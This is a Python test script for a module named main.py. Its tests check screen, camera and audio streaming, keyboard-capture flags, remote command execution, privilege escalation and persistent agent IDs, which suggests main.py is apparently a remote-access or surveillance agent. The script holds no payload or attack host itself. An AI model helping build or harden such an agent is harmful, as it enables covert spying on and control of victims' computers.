#!/usr/bin/env python3
"""
Comprehensive test script for main.py fixes
Tests all error handling, dependency checks, and cross-platform compatibility
"""

import sys
import platform
import traceback

def test_imports():
    """Test that all imports work correctly."""
    print("Testing imports...")
    try:
        import main
        print("✅ Main module imported successfully")
        return True
    except Exception as e:
        print(f"❌ Import failed: {e}")
        traceback.print_exc()
        return False

def test_platform_detection():
    """Test platform detection."""
    print("\nTesting platform detection...")
    try:
        import main
        print(f"Platform: {platform.system()}")
        print(f"WINDOWS_AVAILABLE: {main.WINDOWS_AVAILABLE}")
        print("✅ Platform detection working")
        return True
    except Exception as e:
        print(f"❌ Platform detection failed: {e}")
        return False

def test_dependency_flags():
    """Test dependency availability flags."""
    print("\nTesting dependency flags...")
    try:
        import main
        flags = [
            'MSS_AVAILABLE', 'NUMPY_AVAILABLE', 'CV2_AVAILABLE', 
            'PYAUDIO_AVAILABLE', 'PYNPUT_AVAILABLE', 'PYGAME_AVAILABLE',
            'WEBSOCKETS_AVAILABLE', 'SPEECH_RECOGNITION_AVAILABLE',
            'PSUTIL_AVAILABLE', 'PIL_AVAILABLE', 'PYAUTOGUI_AVAILABLE',
            'SOCKETIO_AVAILABLE'
        ]
        
        for flag in flags:
            if hasattr(main, flag):
                value = getattr(main, flag)
                status = "✅" if value else "⚠️"
                print(f"{status} {flag}: {value}")
            else:
                print(f"❌ {flag}: Not found")
        
        print("✅ Dependency flags working")
        return True
    except Exception as e:
        print(f"❌ Dependency flags test failed: {e}")
        return False

def test_background_initializer():
    """Test BackgroundInitializer class."""
    print("\nTesting BackgroundInitializer...")
    try:
        import main
        initializer = main.BackgroundInitializer()
        
        # Test initialization
        initializer.start_background_initialization(quick_startup=True)
        
        # Wait a bit for initialization
        import time
        time.sleep(2)
        
        # Check status
        status = initializer.get_initialization_status()
        print(f"Initialization status: {len(status)} tasks")
        
        # Test completion
        completed = initializer.wait_for_completion(timeout=5)
        print(f"Initialization completed: {completed}")
        
        print("✅ BackgroundInitializer working")
        return True
    except Exception as e:
        print(f"❌ BackgroundInitializer test failed: {e}")
        return False

def test_streaming_functions():
    """Test streaming functions with error handling."""
    print("\nTesting streaming functions...")
    try:
        import main
        
        # Test screen streaming (should handle missing dependencies gracefully)
        if not main.MSS_AVAILABLE:
            print("⚠️ MSS not available, testing error handling...")
            main.stream_screen("test-agent")
            print("✅ Screen streaming error handling working")
        
        # Test camera streaming
        if not main.CV2_AVAILABLE:
            print("⚠️ OpenCV not available, testing error handling...")
            main.stream_camera("test-agent")
            print("✅ Camera streaming error handling working")
        
        # Test audio streaming
        if not main.PYAUDIO_AVAILABLE:
            print("⚠️ PyAudio not available, testing error handling...")
            main.stream_audio("test-agent")
            print("✅ Audio streaming error handling working")
        
        print("✅ Streaming functions working")
        return True
    except Exception as e:
        print(f"❌ Streaming functions test failed: {e}")
        return False

def test_command_execution():
    """Test command execution with error handling."""
    print("\nTesting command execution...")
    try:
        import main
        
        # Test basic command execution
        result = main.execute_command("echo 'test'")
        print(f"Command execution result: {result[:50]}...")
        
        # Test invalid command
        result = main.execute_command("invalid_command_that_should_fail")
        print(f"Invalid command result: {result[:50]}...")
        
        print("✅ Command execution working")
        return True
    except Exception as e:
        print(f"❌ Command execution test failed: {e}")
        return False

def test_privilege_functions():
    """Test privilege-related functions."""
    print("\nTesting privilege functions...")
    try:
        import main
        
        # Test admin check
        is_admin = main.is_admin()
        print(f"Admin privileges: {is_admin}")
        
        # Test privilege escalation (should handle gracefully on non-Windows)
        if not main.WINDOWS_AVAILABLE:
            print("⚠️ Windows not available, testing error handling...")
            result = main.elevate_privileges()
            print(f"Privilege escalation result: {result}")
        
        print("✅ Privilege functions working")
        return True
    except Exception as e:
        print(f"❌ Privilege functions test failed: {e}")
        return False

def test_agent_id():
    """Test agent ID generation."""
    print("\nTesting agent ID generation...")
    try:
        import main
        
        agent_id = main.get_or_create_agent_id()
        print(f"Agent ID: {agent_id}")
        
        if agent_id and len(agent_id) > 0:
            print("✅ Agent ID generation working")
            return True
        else:
            print("❌ Agent ID generation failed")
            return False
    except Exception as e:
        print(f"❌ Agent ID test failed: {e}")
        return False

def test_main_loop_logic():
    """Test main loop logic without actual execution."""
    print("\nTesting main loop logic...")
    try:
        import main
        
        # Test internal commands dictionary
        internal_commands = {
            "start-stream": lambda: print("start-stream"),
            "stop-stream": lambda: print("stop-stream"),
            "start-audio": lambda: print("start-audio"),
            "stop-audio": lambda: print("stop-audio"),
        }
        
        # Test command handling logic
        test_commands = ["start-stream", "stop-stream", "echo 'test'", "sleep"]
        
        for cmd in test_commands:
            if cmd in internal_commands:
                print(f"✅ Internal command: {cmd}")
            else:
                print(f"✅ External command: {cmd}")
        
        print("✅ Main loop logic working")
        return True
    except Exception as e:
        print(f"❌ Main loop logic test failed: {e}")
        return False

def main():
    """Run all tests."""
    print("=" * 80)
    print("Comprehensive Test Suite for main.py Fixes")
    print("=" * 80)
    
    tests = [
        ("Import Test", test_imports),
        ("Platform Detection", test_platform_detection),
        ("Dependency Flags", test_dependency_flags),
        ("Background Initializer", test_background_initializer),
        ("Streaming Functions", test_streaming_functions),
        ("Command Execution", test_command_execution),
        ("Privilege Functions", test_privilege_functions),
        ("Agent ID Generation", test_agent_id),
        ("Main Loop Logic", test_main_loop_logic),
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\n{'='*20} {test_name} {'='*20}")
        try:
            if test_func():
                passed += 1
            else:
                print(f"❌ {test_name} failed")
        except Exception as e:
            print(f"❌ {test_name} failed with exception: {e}")
            traceback.print_exc()
    
    print("\n" + "=" * 80)
    print(f"Test Results: {passed}/{total} tests passed")
    print("=" * 80)
    
    if passed == total:
        print("🎉 All tests passed! The main.py file is working correctly.")
        print("✅ All error handling is in place")
        print("✅ All dependency checks are working")
        print("✅ Cross-platform compatibility is maintained")
        return True
    else:
        print("⚠️ Some tests failed. Please review the errors above.")
        return False

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)